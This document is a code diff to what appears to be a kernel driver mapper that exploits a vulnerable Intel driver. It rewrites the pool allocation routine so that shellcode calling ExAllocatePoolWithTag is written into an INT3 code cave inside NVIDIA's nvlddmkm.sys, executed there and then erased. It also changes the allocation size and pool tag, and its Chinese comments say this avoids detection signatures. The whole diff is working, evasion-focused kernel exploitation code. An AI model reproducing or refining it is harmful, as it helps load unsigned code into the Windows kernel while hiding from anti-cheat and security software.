@@ -680,27 +680,89 @@ uint64_t intel_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
 	if (!size)
 		return 0;
 
-	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");
+	// [修改] 移除强制 2MB 大小的逻辑
+	// 改为动态大小：确保按照 4KB (0x1000) 页对齐即可
+	// 正常的驱动加载器都会按页对齐申请内存
+	if (size % 0x1000 != 0) {
+		size = (size & ~(0xFFF)) + 0x1000;
+	}
 
+	// 可以在这里添加少量的随机 Padding（例如 0-256 字节），防止大小完全固定匹配特征
+	// 但通常只要不使用巨大的固定值（如 0x200000），这就足够安全了
+
+	// 1. 获取内核函数 ExAllocatePoolWithTag 的真实地址
+	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");
 	if (!kernel_ExAllocatePool) {
 		kdmLog(L"[!] Failed to find ExAllocatePool" << std::endl);
 		return 0;
 	}
 
-	uint64_t allocated_pool = 0;
-
-	// [新增修改] 如果申请的内存小于 2MB (0x200000)，则强制扩大为 2MB
-	if (size < 0x200000) {
-		size = 0x200000;
+	// 2. 获取 nvlddmkm.sys (NVIDIA 驱动) 的基址
+	uint64_t nv_base = kdmUtils::GetKernelModuleAddress("nvlddmkm.sys");
+	if (!nv_base) {
+		kdmLog(L"[-] nvlddmkm.sys not found. Ensure NVIDIA driver is loaded." << std::endl);
+		return 0;
 	}
 
-	// [新增修改] 将 Pool Tag 从 'BwtE' 修改为 'AdvN'
-	if (!CallKernelFunction(&allocated_pool, kernel_ExAllocatePool, pool_type, size, 'AdvN'))
+	// 3. 在 nvlddmkm.sys 中寻找 Code Cave
+	constexpr uint32_t shellcode_size = 13;
+	constexpr uint32_t search_size = 15;
+
+	BYTE cave_pattern[search_size];
+	char cave_mask[search_size + 1];
+	for (int i = 0; i < search_size; i++) {
+		cave_pattern[i] = 0xCC; // INT3 Padding
+		cave_mask[i] = 'x';
+	}
+	cave_mask[search_size] = '\0';
+
+	// 优先在 PAGE 段搜索
+	uint64_t codecave = intel_driver::FindPatternInSectionAtKernel("PAGE", nv_base, cave_pattern, cave_mask);
+	if (!codecave) {
+		codecave = intel_driver::FindPatternInSectionAtKernel(".text", nv_base, cave_pattern, cave_mask);
+	}
+
+	if (!codecave) {
+		kdmLog(L"[-] Failed to find suitable Code Cave in nvlddmkm.sys" << std::endl);
 		return 0;
+	}
+
+	kdmLog(L"[+] Found Code Cave at: 0x" << reinterpret_cast<void*>(codecave) << std::endl);
+
+	// 4. 构造 Shellcode (保持不变)
+	BYTE shellcode[shellcode_size] = {
+		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, ...
+		0xFF, 0xD0,                                                 // call rax
+		0xC3                                                        // ret
+	};
+
+	*(uint64_t*)(shellcode + 2) = kernel_ExAllocatePool;
+
+	// 5. 写入 Shellcode
+	if (!intel_driver::WriteToReadOnlyMemory(codecave, shellcode, shellcode_size)) {
+		kdmLog(L"[-] Failed to write shellcode to Code Cave" << std::endl);
+		return 0;
+	}
+
+	// 6. 执行 Shellcode
+	// 参数直接透传：size 现在是经过对齐的动态大小
+	uint64_t allocated_pool = 0;
+	if (!CallKernelFunction(&allocated_pool, codecave, pool_type, size, 'AdvN')) {
+		kdmLog(L"[-] Failed to execute Shellcode in Code Cave" << std::endl);
+		intel_driver::WriteToReadOnlyMemory(codecave, cave_pattern, shellcode_size);
+		return 0;
+	}
+
+	// 7. 恢复 Code Cave
+	if (!intel_driver::WriteToReadOnlyMemory(codecave, cave_pattern, shellcode_size)) {
+		kdmLog(L"[!] CRITICAL: Failed to restore Code Cave!" << std::endl);
+	}
+	else {
+		kdmLog(L"[+] Code Cave restored successfully" << std::endl);
+	}
 
 	return allocated_pool;
 }
-
 bool intel_driver::FreePool(uint64_t address) {
 	if (!address)
 		return 0;
